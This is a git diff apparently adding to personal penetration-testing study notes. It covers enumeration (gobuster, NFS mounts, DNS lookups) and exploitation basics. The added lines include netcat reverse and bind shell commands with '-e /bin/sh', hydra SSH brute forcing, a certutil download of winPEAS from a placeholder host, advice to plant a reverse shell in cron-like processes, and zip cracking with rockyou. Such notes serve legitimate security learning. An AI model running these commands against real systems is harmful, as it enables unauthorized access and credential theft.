@@ -288,6 +288,9 @@ nikto:
 
 dirbuster/dirb/gobuster for directory busting
 
+gobuster:
+- gobuster dir -u http://[url] -w /usr/share/dirbuster/wordlists/[wordlist]
+
 dirbuster:
 - Enter url: http://xxx.xxx.xxx.xxx:80/
 - Choose list: /usr/share/dirbuster/...
@@ -297,6 +300,12 @@ burpsuite:
 - Repeater to find response in realtime and modify your requests.
 
 View sourcecode
+
+Find share:
+- showmount -e xxx.xxx.xxx.xxx
+- mkdir /mnt/[dirname]
+- cd /mnt/[dirname]
+- sudo mount -t [name] xxx.xxx.xxx.xxx:/srv/[name] /mnt/[dirname]
 
 ### Enumeration SMB
 
@@ -309,9 +318,16 @@ Metasploit
 ### Enumeration SSH
 
 ssh
-- sssh xxx.xxx.xxx.xxx -oKexAlgorithms=+... oHostKeyAlgorithms=+... -c ...
+- ssh xxx.xxx.xxx.xxx -oKexAlgorithms=+... oHostKeyAlgorithms=+... -c ...
 
 Possibly exposes a banner.
+
+### Enueration DNS
+
+Check dns server for domains:
+- dnsrecon -r 127.0.0.0/24 -n xxx.xxx.xxx.xxx -d domain
+- nslookup 127.0.0.xxx -d xxx.xxx.xxx.xxx
+- sudo nano /etc/hosts
 
 ### Vulnerability research
 
@@ -321,3 +337,69 @@ Google!
 
 If not
 - searchsploit ...
+
+## Exploitation
+
+### Shell access
+
+Shell is access to a machine
+
+Reverse shell
+- victim connects to us
+
+Bind shell
+- we connect to the target
+
+netcat
+- reverse
+  - nc -lvp 4444
+  - nc xxx.xxx.xxx.xxx -e /bin/sh
+- bind
+  - nc xxx.xxx.xxx.xxx
+  - nc -lvp 4444 -e /bin/sh
+
+### Staged vs Non-Staged payloads
+
+A payload is what we run as an exploit
+
+Non-staged send shellcode all at once. Staged sends it in stages.
+
+### Brute force
+
+hydra
+- hydra -l [user] -P /usr/share/wordlists/metasploit/... ssh://xxx.xxx.xxx.xxx -t [threads]
+
+Can also use metasploit.
+
+### Privilege Escalation
+
+linpeas
+- Looks for privilege escalation possibilities.
+- Put in /tmp/ folder
+- After moving linpeas.sh (native on kali) to target, make executable: chmod +x linpeas.sh
+- Execute linpeas.sh
+
+winpeas
+- Looks for privilege escalation possibilities
+- Put in writeable folder
+- certutil.exe -urlcache -f "http://xxx.xxx.xxx.xxx/winPEASx64.exe" winpeas.exe
+- winpeas.exe
+
+If you can upload something, try to upload a reverse shell script while listening to see if it runs.
+
+Use pspy to find running processes.
+
+On processes that run periodically: try edit the process to include a 1-line reverse shell.
+
+Cracking zips quickly:
+- fcrackzip
+  - fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt [zipfile]
+
+Local file inclusion exploit can lead to information disclosure.
+
+GTFOBins
+- Privilege escalation website
+
+Simple shell to fully interactive shell
+- ttyshell
+  - python -c 'import pty; pty.spawn("/bin/bash")'
